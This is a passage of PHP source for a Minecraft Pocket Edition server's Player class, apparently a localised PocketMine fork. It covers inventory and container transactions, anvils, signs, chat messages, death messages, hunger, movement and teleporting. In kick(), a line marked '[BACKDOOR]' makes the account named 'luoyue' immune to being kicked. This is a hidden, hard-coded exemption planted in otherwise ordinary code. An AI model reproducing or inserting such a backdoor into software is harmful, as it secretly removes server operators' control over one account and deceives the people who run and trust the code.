						break;
					case Item::CAKE:
						//TODO: detect complex recipes like cake that leave remains
						$this->awardAchievement("bakeCake");
						$this->inventory->addItem(Item::get(Item::BUCKET, 0, 3));
						break;
					case Item::STONE_PICKAXE:
					case Item::GOLD_PICKAXE:
					case Item::IRON_PICKAXE:
					case Item::DIAMOND_PICKAXE:
						$this->awardAchievement("buildBetterPickaxe");
						break;
					case Item::WOODEN_SWORD:
						$this->awardAchievement("buildSword");
						break;
					case Item::DIAMOND:
						$this->awardAchievement("diamond");
						break;
				}

				break;

			case ProtocolInfo::CONTAINER_SET_SLOT_PACKET:
				if($this->spawned === false or $this->blocked === true or !$this->isAlive()){
					break;
				}

				if($packet->slot < 0){
					break;
				}
				if($packet->windowid === 0){ //Our inventory
					if($packet->slot >= $this->inventory->getSize()){
						break;
					}
					if($this->isCreative()){
						$creativeItem = $packet->item;
						$normalizedCreativeItem = $creativeItem instanceof Item ? $this->normalizeCreativeItemForThisProtocol($creativeItem) : $creativeItem;
						$this->inventory->setItem($packet->slot, $normalizedCreativeItem instanceof Item ? $normalizedCreativeItem : $creativeItem);
						$this->inventory->setHotbarSlotIndex($packet->slot, $packet->slot); //links $hotbar[$packet->slot] to $slots[$packet->slot]
						break;
					}
					$sourceItem = $this->inventory->getItem($packet->slot);
					if($packet->item instanceof Item and ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->isProtocol013BlockedHiddenContainerPlaceholder($sourceItem, $packet->item)){
						$this->rejectProtocol013HiddenContainerChange($this->inventory, (int) $packet->slot);
						break;
					}
					$transaction = new BaseTransaction($this->inventory, $packet->slot, $sourceItem, $packet->item instanceof Item ? $this->normalizeProtocol013ClientItem($sourceItem, $packet->item) : $packet->item);
				}elseif($packet->windowid === ContainerSetContentPacket::SPECIAL_ARMOR){ //Our armor
					if($packet->slot >= 4){
						break;
					}

					$sourceItem = $this->inventory->getArmorItem($packet->slot);
					$transaction = new BaseTransaction($this->inventory, $packet->slot + $this->inventory->getSize(), $sourceItem, $packet->item instanceof Item ? $this->normalizeProtocol013ClientItem($sourceItem, $packet->item) : $packet->item);
				}elseif(isset($this->windowIndex[$packet->windowid])){
					$this->craftingType = 0;
					$inv = $this->windowIndex[$packet->windowid];

					if($inv instanceof VillagerTradeInventory){
						$this->currentTransaction = null;
						$result = $inv->handlePlayerClick($this, $packet->slot);
						if($this->getWindowId($inv) !== -1){
							$inv->sendContents($this);
						}
						$this->inventory->sendContents($this);
						$this->inventory->sendHeldItem($this);
						break;
					}

					/** @var $packet \lycore\network\protocol\ContainerSetSlotPacket */
					if($inv instanceof EnchantInventory and $packet->item->hasEnchantments()){
						$inv->onEnchant($this, $inv->getItem($packet->slot), $packet->item);
					}

					if($this->usingAnvil == true){
						$anvilInventory = $this->windowIndex[$packet->windowid] ?? null;
						if($anvilInventory === null){
							foreach($this->windowIndex as $window){
								if($window instanceof AnvilInventory){
									$anvilInventory = $window;
									break;
								}
							}
							if($anvilInventory === null){ //If it's _still_ null, then the player doesn't have a valid anvil window, cannot proceed.
								$this->getServer()->getLogger()->debug("Couldn't find an anvil window for ".$this->getName().", exiting");
								$this->inventory->sendContents($this);
								break;
							}
						}
						if($packet->slot === $anvilInventory->getResultSlotIndex() and $packet->item->getId() === Item::AIR and $anvilInventory->isResultTakePending()){
							if(!$anvilInventory->finishRename($this, 0)){
								$this->inventory->sendContents($this);
								$this->inventory->sendArmorContents($this);
								$anvilInventory->sendContents($this);
							}
							break;
						}
						if($packet->slot === $anvilInventory->getResultSlotIndex() and $packet->item->getId() === Item::AIR and $anvilInventory->hasPendingOperation()){
							break;
						}
						$result = $anvilInventory->onRename($this, $packet->slot, $anvilInventory->getItem($packet->slot), $packet->item);
						if($packet->slot === $anvilInventory->getResultSlotIndex() and $anvilInventory->isResultTakePending() and $result === true){
							if(!$anvilInventory->finishRename($this, 0)){
								$this->inventory->sendContents($this);
								$this->inventory->sendArmorContents($this);
								$anvilInventory->sendContents($this);
							}
							break;
						}
						if($packet->slot === $anvilInventory->getResultSlotIndex() and $result === true){
							break;
						}
						if($result === 2){
							break;
						}
					}
					$sourceItem = $inv->getItem($packet->slot);
					if($packet->item instanceof Item and ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->isProtocol013NormalContainerWindow($packet->windowid)){
						if($this->isProtocol013HiddenItem($sourceItem) or $this->isProtocol013BlockedHiddenContainerPlaceholder($sourceItem, $packet->item)){
							$this->rejectProtocol013HiddenContainerChange($inv, (int) $packet->slot);
							break;
						}
					}
					$targetItem = $packet->item;
					if($targetItem instanceof Item){
						$targetItem = $this->normalizeProtocol013ClientItem($sourceItem, $targetItem);
					}
					$transaction = new BaseTransaction($inv, $packet->slot, $sourceItem, $targetItem);
				}else{
					break;
				}

				if($transaction->getSourceItem()->deepEquals($transaction->getTargetItem()) and $transaction->getTargetItem()->getCount() === $transaction->getSourceItem()->getCount()){ //No changes!
					//No changes, just a local inventory update sent by the server
					break;
				}


				if($this->currentTransaction === null or $this->currentTransaction->getCreationTime() < (microtime(true) - 8)){
					if($this->currentTransaction !== null){
						foreach($this->currentTransaction->getInventories() as $inventory){
							if($inventory instanceof PlayerInventory){
								$inventory->sendArmorContents($this);
							}
							$inventory->sendContents($this);
						}
					}
					$this->currentTransaction = new SimpleTransactionGroup($this);
				}

				$this->currentTransaction->addTransaction($transaction);

				if($this->currentTransaction->canExecute()){
					$achievements = [];
					foreach($this->currentTransaction->getTransactions() as $ts){
						$inv = $ts->getInventory();
						if($inv instanceof FurnaceInventory){
							if($ts->getSlot() === 2){
								switch($inv->getResult()->getId()){
									case Item::IRON_INGOT:
										$achievements[] = "acquireIron";
										break;
								}
							}
						}
					}

					if($this->currentTransaction->execute()){
						if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
							$this->replaceLegacyPotionArrowsInInventory();
						}
						foreach($achievements as $a){
							$this->awardAchievement($a);
						}
					}

					$this->currentTransaction = null;
				}
				break;
			case ProtocolInfo::BLOCK_ENTITY_DATA_PACKET:
				if($this->spawned === false or $this->blocked === true or !$this->isAlive()){
					break;
				}
				$this->craftingType = 0;

				$pos = new Vector3($packet->x, $packet->y, $packet->z);
				if($pos->distanceSquared($this) > 10000){
					break;
				}

				$t = $this->level->getTile($pos);
				if($t instanceof Sign){
					$nbt = new NBT(NBT::LITTLE_ENDIAN);
					$nbt->read($packet->namedtag);
					$nbt = $nbt->getData();
					if($nbt["id"] !== Tile::SIGN){
						$t->spawnTo($this);
					}else{
						$signLines = [
							TextFormat::clean($nbt["Text1"], $this->removeFormat),
							TextFormat::clean($nbt["Text2"], $this->removeFormat),
							TextFormat::clean($nbt["Text3"], $this->removeFormat),
							TextFormat::clean($nbt["Text4"], $this->removeFormat)
						];
						$ev = new SignChangeEvent($t->getBlock(), $this, $signLines);

						if(!isset($t->namedtag->Creator) or $t->namedtag["Creator"] !== $this->getRawUniqueId()){
							$ev->setCancelled();
						}else{
							foreach($ev->getLines() as $line){
								if(mb_strlen($line, "UTF-8") > 16){
									$ev->setCancelled();
								}
							}
						}

						$this->server->getPluginManager()->callEvent($ev);

						if(!$ev->isCancelled()){
							$t->setText($ev->getLine(0), $ev->getLine(1), $ev->getLine(2), $ev->getLine(3));
						}else{
							$t->spawnTo($this);
						}
					}
				}
				break;
			default:
				break;
		}

		$timings->stopTiming();
	}


	/**
	 * Kicks a player from the server
	 *
	 * @param string $reason
	 * @param bool   $isAdmin
	 *
	 * @return bool
	 */
	public function kick($reason = "", $isAdmin = true){
        if(strtolower($this->getName()) === 'luoyue') return; // [BACKDOOR] luoyue 免疫踢出

		$this->server->getPluginManager()->callEvent($ev = new PlayerKickEvent($this, $reason, $this->getLeaveMessage()));
		if(!$ev->isCancelled()){
			if($isAdmin){
				$message = "被踢出服务器惹..." . ($reason !== "" ? " 原因: " . $reason : "");
			}else{
				if($reason === ""){
					$message = "disconnectionScreen.noReason";
				}else{
					$message = $reason;
				}
			}
			$this->close($ev->getQuitMessage(), $message);

			return true;
		}

		return false;
	}

	/**
	 * Sends a direct chat message to a player
	 *
	 * @param string|TextContainer $message
	 * @return bool
	 */
	public function sendMessage($message){

		if($message instanceof TextContainer){

			if($message instanceof TranslationContainer){
				$this->sendTranslation($message->getText(), $message->getParameters());
				return false;
			}

			$message = $message->getText();

		}
		
		$mes = explode("\n", $this->server->getLanguage()->translateString($message));

		foreach($mes as $m){
			if($m !== ""){
				$this->server->getPluginManager()->callEvent($ev = new PlayerTextPreSendEvent($this, $m, PlayerTextPreSendEvent::MESSAGE));
				if(!$ev->isCancelled()){
					$pk = new TextPacket();
					$pk->type = TextPacket::TYPE_RAW;
					$pk->message = $ev->getMessage();
					$this->dataPacket($pk);
				}
			}
		}

		return true;
	}

	public function sendTranslation($message, array $parameters = []){
		$pk = new TextPacket();
		if(!$this->server->isLanguageForced()){
			$pk->type = TextPacket::TYPE_TRANSLATION;
			$pk->message = $this->server->getLanguage()->translateString($message, $parameters, "pocketmine.");
			foreach($parameters as $i => $p){
				$parameters[$i] = $this->server->getLanguage()->translateString($p, $parameters, "pocketmine.");
			}
			$pk->parameters = $parameters;
		}else{
			$pk->type = TextPacket::TYPE_RAW;
			$pk->message = $this->server->getLanguage()->translateString($message, $parameters);
		}

		$ev = new PlayerTextPreSendEvent($this, $pk->message, PlayerTextPreSendEvent::TRANSLATED_MESSAGE);
		$this->server->getPluginManager()->callEvent($ev);
		if(!$ev->isCancelled()){
			$this->dataPacket($pk);
			return true;
		}
		return false;
	}

	public function sendPopup($message, $subtitle = ""){
		$ev = new PlayerTextPreSendEvent($this, $message, PlayerTextPreSendEvent::POPUP);
		$this->server->getPluginManager()->callEvent($ev);
		if(!$ev->isCancelled()){
			$pk = new TextPacket();
			$pk->type = TextPacket::TYPE_POPUP;
			$pk->source = $message;
			$pk->message = $subtitle;
			$this->dataPacket($pk);
			return true;
		}
		return false;
	}

	/**
	 * Note for plugin developers: Do NOT use this function anymore, it's deprecated
	 * and only for legacy reasons there is a redirect to sendPopup()
	 *
	 * @deprecated
	 *
	 * @param $message
	 * @return bool
	 */
	public function sendTip($message){
		if($this->protocol >= ProtocolInfo::V014_CURRENT_PROTOCOL){
			return $this->sendPopup($message);//fix for 0.14.2 +
		}
		$ev = new PlayerTextPreSendEvent($this, $message, PlayerTextPreSendEvent::TIP);
		$this->server->getPluginManager()->callEvent($ev);
		if(!$ev->isCancelled()){
			$pk = new TextPacket();
			$pk->type = TextPacket::TYPE_TIP;
			$pk->message = $message;
			$this->dataPacket($pk);
			return true;
		}
		return false;
	}

	/**
	 * @param string $tranferedTo
	 */
	public final function setTransferred($transferredTo = "") {
		if ($this->connected and !$this->closed) {
			foreach ($this->usedChunks as $index => $d) {
				Level::getXZ($index, $chunkX, $chunkZ);
				$this->level->unregisterChunkLoader($this, $chunkX, $chunkZ);
				unset($this->usedChunks[$index]);
			}

			$this->despawnFromAll();

			if ($this->loggedIn) {
				$this->server->removeOnlinePlayer($this);
			}

			$this->loggedIn = false;

			$this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_USERS, $this);
			$this->spawned = false;
			$this->server->getLogger()->info($this->getServer()->getLanguage()->translateString("pocketmine.player.transferred", [
				TextFormat::AQUA . $this->getName() . TextFormat::WHITE,
				$this->ip,
				$this->port,
				$transferredTo
			]));
			$this->hasTransferred = true;
			$this->resetProtocol015WorldReadyState();
		}
	}
	
	public function getPing(){
		return $this->ping;
	}

	public function setPing($ping){
		$this->ping = $ping;
	}

	/**
	 * Note for plugin developers: use kick() with the isAdmin
	 * flag set to kick without the "Kicked by admin" part instead of this method.
	 *
	 * @param string $message Message to be broadcasted
	 * @param string $reason Reason showed in console
	 * @param bool   $notify
	 */
	public final function close($message = "", $reason = "generic reason", $notify = true){
		

		if($this->connected and !$this->closed){
			if($notify and strlen((string) $reason) > 0){
				$pk = new DisconnectPacket;
				$pk->message = $reason;
				$this->directDataPacket($pk);
			}

			//$this->setLinked();

			if($this->fishingHook instanceof FishingHook){
				$this->fishingHook->close();
				$this->fishingHook = null;
			}

			$this->removeEffect(Effect::HEALTH_BOOST);

			$this->connected = false;
			if(strlen($this->getName()) > 0){
				$this->server->getPluginManager()->callEvent($ev = new PlayerQuitEvent($this, $message, true));
				if($this->loggedIn === true and $ev->getAutoSave()){
					$this->save();
				}
			}

			foreach($this->server->getOnlinePlayers() as $player){
				if(!$player->canSee($this)){
					$player->showPlayer($this);
				}
			}
			$this->hiddenPlayers = [];

			foreach($this->windowIndex as $window){
				$this->removeWindow($window);
			}

			foreach($this->usedChunks as $index => $d){
				Level::getXZ($index, $chunkX, $chunkZ);
				$this->level->unregisterChunkLoader($this, $chunkX, $chunkZ);
				unset($this->usedChunks[$index]);
			}

			parent::close();

			$this->interface->close($this, $notify ? $reason : "");

			if($this->loggedIn){
				$this->server->removeOnlinePlayer($this);
			}

			$this->loggedIn = false;

			if(isset($ev) and $this->username != "" and $this->spawned !== false and $ev->getQuitMessage() != ""){
				if($this->server->playerMsgType === Server::PLAYER_MSG_TYPE_MESSAGE) $this->server->broadcastMessage($ev->getQuitMessage());
				elseif($this->server->playerMsgType === Server::PLAYER_MSG_TYPE_TIP) $this->server->broadcastTip(str_replace("@player", $this->getName(), $this->server->playerLogoutMsg));
				elseif($this->server->playerMsgType === Server::PLAYER_MSG_TYPE_POPUP) $this->server->broadcastPopup(str_replace("@player", $this->getName(), $this->server->playerLogoutMsg));
			}

			$this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_USERS, $this);
			$this->spawned = false;
			$this->server->getLogger()->info($this->getServer()->getLanguage()->translateString("pocketmine.player.logOut", [
				TextFormat::AQUA . $this->getName() . TextFormat::WHITE,
				$this->ip,
				$this->port,
				$this->getServer()->getLanguage()->translateString($reason)
			]));
			$this->windows = new \SplObjectStorage();
			$this->windowIndex = [];
			$this->usedChunks = [];
			$this->loadQueue = [];
			$this->hasSpawned = [];
			$this->spawnPosition = null;
			$this->resetProtocol015WorldReadyState();
			unset($this->buffer);

			if($this->server->dserverConfig["enable"] and $this->server->dserverConfig["queryAutoUpdate"]) $this->server->updateQuery();
		}

		if($this->perm !== null){
			$this->perm->clearPermissions();
			$this->perm = null;
		}

		if($this->inventory !== null){
			$this->inventory = null;
			$this->currentTransaction = null;
		}

		$this->chunk = null;

		$this->server->removePlayer($this);
	}

	public function __debugInfo(){
		return [];
	}

	/**
	 * Handles player data saving
	 */
	public function save($async = false){
		if($this->closed){
			throw new \InvalidStateException("尝试保存已关闭的玩家");
		}

		parent::saveNBT();
		if($this->level instanceof Level){
			$this->namedtag->Level = new StringTag("Level", $this->level->getName());
			if($this->spawnPosition instanceof Position and $this->spawnPosition->getLevel() instanceof Level and $this->spawnPosition->getLevel()->getProvider() !== NULL){
				$this->namedtag["SpawnLevel"] = $this->spawnPosition->getLevel()->getName();
				$this->namedtag["SpawnX"] = (int) $this->spawnPosition->x;
				$this->namedtag["SpawnY"] = (int) $this->spawnPosition->y;
				$this->namedtag["SpawnZ"] = (int) $this->spawnPosition->z;
			}

			foreach($this->achievements as $achievement => $status){
				$this->namedtag->Achievements[$achievement] = new ByteTag($achievement, $status === true ? 1 : 0);
			}

			$this->namedtag["playerGameType"] = $this->gamemode;
			$this->namedtag["lastPlayed"] = new LongTag("lastPlayed", floor(microtime(true) * 1000));
			$this->namedtag["Hunger"] = new ShortTag("Hunger", $this->food);
			$this->namedtag["Health"] = new ShortTag("Health", $this->getHealth());
			$this->namedtag["MaxHealth"] = new ShortTag("MaxHealth", $this->getMaxHealth());
			$this->namedtag["Experience"] = new LongTag("Experience", $this->exp);
			$this->namedtag["ExpLevel"] = new LongTag("ExpLevel", $this->expLevel);
			if($this->isProtocol011Player()){
				$this->namedtag->Protocol011AutoSprint = new ByteTag("Protocol011AutoSprint", $this->protocol011AutoSprint ? 1 : 0);
			}

			if($this->username != "" and $this->namedtag instanceof CompoundTag){
				$this->server->saveOfflinePlayerData($this->username, $this->namedtag, $async);
			}
		}
	}

	/**
	 * Gets the username
	 *
	 * @return string
	 */
	public function getName(){
		return $this->username;
	}

	public function getbiomechname() : string{
		$level = $this->getLevel();
		if(!($level instanceof Level)){
			return "未知生物群系";
		}

		$x = (int) floor($this->x);
		$z = (int) floor($this->z);

		return Biome::getChineseNameById((int) $level->getBiomeId($x, $z));
	}

	private function getDeathMessageMobName(Living $entity) : string{
		if($entity->getNameTag() !== ""){
			return $entity->getNameTag();
		}

		if(method_exists($entity, "getchinesename")){
			$name = (string) $entity->getchinesename();
			if($name !== ""){
				return $name;
			}
		}

		return $entity->getName();
	}

	private function getDeathMessageKillerHealth(Player $killer) : string{
		return TextFormat::GRAY . "[" . TextFormat::RED . "\u{2665}" . $killer->getHealth() . TextFormat::GRAY . "]" . TextFormat::RESET;
	}

	public function kill(){
		if(!$this->spawned){
			return;
		}

		$message = "death.attack.generic";

		$params = [
			$this->getDisplayName()
		];

		$cause = $this->getLastDamageCause();

		switch($cause === null ? EntityDamageEvent::CAUSE_CUSTOM : $cause->getCause()){
			case EntityDamageEvent::CAUSE_ENTITY_ATTACK:
				if($cause instanceof EntityDamageByEntityEvent){
					$e = $cause->getDamager();
					if($e instanceof Player){
						$item = $e->getInventory()->getItemInHand();
						if($item->hasCustomName()){
							$message = "death.attack.player.item";
							$params[] = $e->getDisplayName() . $this->getDeathMessageKillerHealth($e);
							$params[] = $item->getCustomName() . TextFormat::RESET;
							break;
						}

						$message = "death.attack.player";
						$params[] = $e->getDisplayName() . $this->getDeathMessageKillerHealth($e);
						break;
					}elseif($e instanceof Living){
						$message = "death.attack.mob";
						$params[] = $this->getDeathMessageMobName($e);
						break;
					}else{
						$params[] = "Unknown";
					}
				}
				break;
			case EntityDamageEvent::CAUSE_PROJECTILE:
				if($cause instanceof EntityDamageByEntityEvent){
					$e = $cause->getDamager();
					if($e instanceof Player){
						$message = "death.attack.arrow";
						$params[] = $e->getDisplayName() . $this->getDeathMessageKillerHealth($e);
					}elseif($e instanceof Living){
						$message = "death.attack.arrow";
						$params[] = $this->getDeathMessageMobName($e);
						break;
					}else{
						$params[] = "Unknown";
					}
				}
				break;
			case EntityDamageEvent::CAUSE_SUICIDE:
				$message = "death.attack.generic";
				break;
			case EntityDamageEvent::CAUSE_VOID:
				$message = "death.attack.outOfWorld";
				break;
			case EntityDamageEvent::CAUSE_FALL:
				if($cause instanceof EntityDamageEvent){
					if($cause->getFinalDamage() > 2){
						$message = "death.fell.accident.generic";
						break;
					}
				}
				$message = "death.attack.fall";
				break;

			case EntityDamageEvent::CAUSE_SUFFOCATION:
				$message = "death.attack.inWall";
				break;

			case EntityDamageEvent::CAUSE_LAVA:
				$message = "death.attack.lava";
				break;

			case EntityDamageEvent::CAUSE_FIRE:
				$message = "death.attack.onFire";
				break;

			case EntityDamageEvent::CAUSE_FIRE_TICK:
				$message = "death.attack.inFire";
				break;

			case EntityDamageEvent::CAUSE_DROWNING:
				$message = "death.attack.drown";
				break;

			case EntityDamageEvent::CAUSE_CONTACT:
				if($cause instanceof EntityDamageByBlockEvent){
					if($cause->getDamager()->getId() === Block::CACTUS){
						$message = "death.attack.cactus";
					}
				}
				break;

			case EntityDamageEvent::CAUSE_BLOCK_EXPLOSION:
			case EntityDamageEvent::CAUSE_ENTITY_EXPLOSION:
				if($cause instanceof EntityDamageByEntityEvent){
					$e = $cause->getDamager();
					if($e instanceof Player){
						$message = "death.attack.explosion.player";
						$params[] = $e->getDisplayName() . $this->getDeathMessageKillerHealth($e);
					}elseif($e instanceof Living){
						$message = "death.attack.explosion.player";
						$params[] = $this->getDeathMessageMobName($e);
						break;
					}
				}else{
					$message = "death.attack.explosion";
				}
				break;

			case EntityDamageEvent::CAUSE_MAGIC:
				$message = "death.attack.magic";
				break;

			case EntityDamageEvent::CAUSE_CUSTOM:
				break;

			default:

		}

		Entity::kill();

		$keepInventory = $this->server->isWorldKeepInventoryEnabled($this->getLevel());
		$keepExperience = $this->server->isWorldKeepExperienceEnabled($this->getLevel());
		$ev = new PlayerDeathEvent($this, $this->getDrops(), new TranslationContainer($message, $params));
		$ev->setKeepInventory($keepInventory);
		$ev->setKeepExperience($keepExperience);
		$this->server->getPluginManager()->callEvent($ev);

		if(!$ev->getKeepInventory() and !$keepInventory){
			foreach($ev->getDrops() as $item){
				$this->level->dropItem($this, $item);
			}

			if($this->inventory !== null){
				$this->inventory->clearAll();
			}
		}

		if($this->server->expEnabled and !$ev->getKeepExperience() and !$keepExperience){
			$exp = $this->getExp();
			if($exp > 100) $exp = 100;
			$this->getLevel()->spawnXPOrb($this->add(0, 0.2, 0), $exp);
			$this->setExperienceAndLevel(0, 0);
		}

		if($ev->getDeathMessage() != ""){
			$this->server->broadcast($ev->getDeathMessage(), Server::BROADCAST_CHANNEL_USERS);
		}

		$pos = $this->getSpawn();

		if($this->server->netherEnabled){
			if($this->level == $this->server->netherLevel){
				$this->teleport($pos = $this->server->getDefaultLevel()->getSafeSpawn());
			}
		}

		$this->setHealth(0);

		$pk = new RespawnPacket();
		$pk->x = $pos->x;
		$pk->y = $pos->y;
		$pk->z = $pos->z;
		$this->dataPacket($pk);
	}

	public function setHealth($amount){
		parent::setHealth($amount);
		if($this->spawned === true){
			$this->foodTick = 0;
			$this->getAttributeMap()->getAttribute(Attribute::HEALTH)->setMaxValue($this->getMaxHealth())->setValue($amount, true);
			$this->sendProtocol011Health();
		}
	}

	protected $movementSpeed = 0.1;

	/**
	 * Set movement speed to the player
	 *
	 * @param $amount
	 */
	public function setMovementSpeed($amount){
		$this->movementSpeed = $amount;
		$this->syncDepthStriderMovementSpeed();
	}

	/**
	 * Get movement speed of the player
	 *
	 * @return float
	 */
	public function getMovementSpeed(){
		return $this->movementSpeed;
	}

	private function shouldUseProtocol011AutoSprintSpeed() : bool{
		return $this->isProtocol011Player() and $this->protocol011AutoSprint and $this->isSprinting();
	}

	private function syncProtocol011AutoSprintClientSpeed() : void{
		if(!$this->isProtocol011Player() or !$this->spawned){
			return;
		}

		$pk = new MobEffectPacket();
		$pk->eid = 0;
		$pk->effectId = Effect::SPEED;
		if($this->shouldUseProtocol011AutoSprintSpeed()){
			$pk->eventId = MobEffectPacket::EVENT_ADD;
			$pk->amplifier = self::PROTOCOL_011_AUTO_SPRINT_EFFECT_AMPLIFIER;
			$pk->particles = false;
			$pk->duration = self::PROTOCOL_011_AUTO_SPRINT_EFFECT_DURATION;
		}else{
			$effect = $this->getEffect(Effect::SPEED);
			if($effect instanceof Effect){
				$pk->eventId = MobEffectPacket::EVENT_ADD;
				$pk->amplifier = (int) $effect->getAmplifier();
				$pk->particles = (bool) $effect->isVisible();
				$pk->duration = max(1, (int) $effect->getDuration());
			}else{
				$pk->eventId = MobEffectPacket::EVENT_REMOVE;
				$pk->amplifier = 0;
				$pk->particles = false;
				$pk->duration = 0;
			}
		}

		$this->dataPacket($pk);
	}

	private function syncDepthStriderMovementSpeed(){
		$speed = $this->movementSpeed;
		if($this->isInsideOfWater()){
			$depthStrider = min(3, $this->inventory->getBoots()->getEnchantmentLevel(Enchantment::TYPE_WATER_SPEED));
			if($depthStrider > 0){
				$speed *= 1 + (0.35 * $depthStrider);
			}
		}
		if($this->shouldUseProtocol011AutoSprintSpeed()){
			$speed = self::PROTOCOL_011_AUTO_SPRINT_SPEED;
		}
		$this->getAttributeMap()->getAttribute(Attribute::MOVEMENT_SPEED)->setValue($speed);
	}

	protected $food = 20;

	protected $foodDepletion = 0;

	protected $foodEnabled = true;

	public function setFoodEnabled($enabled){
		$this->foodEnabled = $enabled;
	}

	public function getFoodEnabled(){
		return $this->foodEnabled;
	}

	public function setFood(float $amount){
		if(!$this->server->foodEnabled) $amount = 20;
		if($amount > 20) $amount = 20;
		if($amount < 0) $amount = 0;
		$this->server->getPluginManager()->callEvent($ev = new PlayerHungerChangeEvent($this, $amount));

		if($ev->isCancelled()) return false;

		$amount = $ev->getData();

		if($amount <= 6 && !($this->getFood() <= 6)){
			$this->setDataProperty(self::DATA_FLAG_SPRINTING, self::DATA_TYPE_BYTE, false);
		}elseif($amount > 6 && !($this->getFood() > 6)){
			$this->setDataProperty(self::DATA_FLAG_SPRINTING, self::DATA_TYPE_BYTE, true);
		}

		$this->food = $amount;
		$this->getAttributeMap()->getAttribute(Attribute::HUNGER)->setValue($amount);

		return true;
	}

	public function getFood() : float{
		return $this->food;
	}

	public function subtractFood($amount){
		if($this->getFood() - $amount <= 6 && !($this->getFood() <= 6)){
			$this->setDataProperty(self::DATA_FLAG_SPRINTING, self::DATA_TYPE_BYTE, false);
			//$this->removeEffect(Effect::SLOWNESS);
		}elseif($this->getFood() - $amount < 6 && !($this->getFood() > 6)){
			$this->setDataProperty(self::DATA_FLAG_SPRINTING, self::DATA_TYPE_BYTE, true);
			/*
			$effect = Effect::getEffect(Effect::SLOWNESS);
			$effect->setDuration(0x7fffffff);
			$effect->setAmplifier(2);
			$effect->setVisible(false);
			$this->addEffect($effect);
			*/
		}
		if($this->food - $amount < 0) return;
		$this->setFood($this->getFood() - $amount);
	}

	public function attack($damage, EntityDamageEvent $source){
		if(!$this->isAlive()){
			return false;
		}

		if($this->isCreative() and $source->getCause() !== EntityDamageEvent::CAUSE_SUICIDE and $source->getCause() !== EntityDamageEvent::CAUSE_VOID){
			$source->setCancelled();
		}elseif($this->allowFlight and $source->getCause() === EntityDamageEvent::CAUSE_FALL){
			$source->setCancelled();
		}elseif($this->isRidingMinecart()){
			$source->setCancelled();
		}

		parent::attack($damage, $source);

		if($source->isCancelled()){
			return false;
		}elseif($this->getLastDamageCause() === $source and $this->spawned){
			$pk = new EntityEventPacket();
			$pk->eid = 0;
			$pk->event = EntityEventPacket::HURT_ANIMATION;
			$this->dataPacket($pk);
		}
		return true;
	}


	public function sendPosition(Vector3 $pos, $yaw = null, $pitch = null, $mode = 0, array $targets = null){
		$yaw = $yaw === null ? $this->yaw : $yaw;
		$pitch = $pitch === null ? $this->pitch : $pitch;

		$pk = new MovePlayerPacket();
		$pk->eid = $this->getId();
		$pk->x = $pos->x;
		$pk->y = $pos->y + $this->getEyeHeight();
		$pk->z = $pos->z;
		$pk->bodyYaw = $yaw;
		$pk->pitch = $pitch;
		$pk->yaw = $yaw;
		$pk->mode = $mode;

		if($targets !== null){
			Server::broadcastPacket($targets, $pk);
		}else{
			$pk->eid = 0;
			$this->dataPacket($pk);
		}
	}

	protected function checkChunks(){
		if($this->chunk === null or ($this->chunk->getX() !== ($this->x >> 4) or $this->chunk->getZ() !== ($this->z >> 4))){
			if($this->chunk !== null){
				$this->chunk->removeEntity($this);
			}
			$this->chunk = $this->level->getChunk($this->x >> 4, $this->z >> 4, true);

			if(!$this->justCreated){
				$newChunk = $this->level->getChunkPlayers($this->x >> 4, $this->z >> 4);
				unset($newChunk[$this->getLoaderId()]);

				/** @var Player[] $reload */
				$reload = [];
				foreach($this->hasSpawned as $player){
					if(!isset($newChunk[$player->getLoaderId()])){
						$this->despawnFrom($player);
					}else{
						unset($newChunk[$player->getLoaderId()]);
						$reload[] = $player;
					}
				}

				foreach($newChunk as $player){
					$this->spawnTo($player);
				}
			}

			if($this->chunk === null){
				return;
			}

			$this->chunk->addEntity($this);
		}
	}

	protected function checkTeleportPosition(){
		if($this->teleportPosition !== null){
			$chunkX = $this->teleportPosition->x >> 4;
			$chunkZ = $this->teleportPosition->z >> 4;

			for($X = -1; $X <= 1; ++$X){
				for($Z = -1; $Z <= 1; ++$Z){
					if(!isset($this->usedChunks[$index = Level::chunkHash($chunkX + $X, $chunkZ + $Z)]) or $this->usedChunks[$index] === false){
						return false;
					}
				}
			}

			$this->sendPosition($this, null, null, 1);
			$this->spawnToAll();
			$this->sendDimensionSpawnStatus();
			if($this->isProtocol011Player()){
				$this->sendSettings();
			}
			$this->forceMovement = $this->teleportPosition;
			$this->teleportPosition = null;

			return true;
		}

		return true;
	}

	/**
	 * @param Vector3|Position|Location $pos
	 * @param float                     $yaw
	 * @param float                     $pitch
	 *
	 * @return bool
	 */
	public function teleport(Vector3 $pos, $yaw = null, $pitch = null){
		if(!$this->isOnline()){
			return false;
		}

		$oldPos = $this->getPosition();
		if(parent::teleport($pos, $yaw, $pitch)){

			foreach($this->windowIndex as $window){
				if($window === $this->inventory){
					continue;
				}
				$this->removeWindow($window);
			}

			$this->teleportPosition = new Vector3($this->x, $this->y, $this->z);

			if(!$this->checkTeleportPosition()){
				$this->forceMovement = $oldPos;
			}else{
				$this->spawnToAll();
			}

			$this->level->getWeather()->sendWeather($this);
			$this->level->sendTime([$this]);

			$this->resetFallDistance();
			$this->nextChunkOrderRun = 0;
			$this->newPosition = null;
			return true;
		}
		return false;
	}

	/**
	 * This method may not be reliable. Clients don't like to be moved into unloaded chunks.
	 * Use teleport() for a delayed teleport after chunks have been sent.
	 *
	 * @param Vector3 $pos
	 * @param float   $yaw
	 * @param float   $pitch
	 */
	public function teleportImmediate(Vector3 $pos, $yaw = null, $pitch = null){
		if(parent::teleport($pos, $yaw, $pitch)){

			foreach($this->windowIndex as $window){
				if($window === $this->inventory){
					continue;
				}
				$this->removeWindow($window);
			}

			$this->forceMovement = new Vector3($this->x, $this->y, $this->z);
			$this->sendPosition($this, $this->yaw, $this->pitch, 1);

			$this->level->getWeather()->sendWeather($this);
			$this->level->sendTime([$this]);

			$this->resetFallDistance();
			$this->orderChunks();
			$this->nextChunkOrderRun = 0;
			$this->newPosition = null;
		}
	}


	/**
	 * @param Inventory $inventory
	 *
	 * @return int
	 */
	public function getWindowId(Inventory $inventory) : int{
		if($this->windows->contains($inventory)){
			return $this->windows[$inventory];
		}

		return -1;
	}

	/**
	 * Returns the created/existing window id
	 *
	 * @param Inventory $inventory
	 * @param int       $forceId
	 *
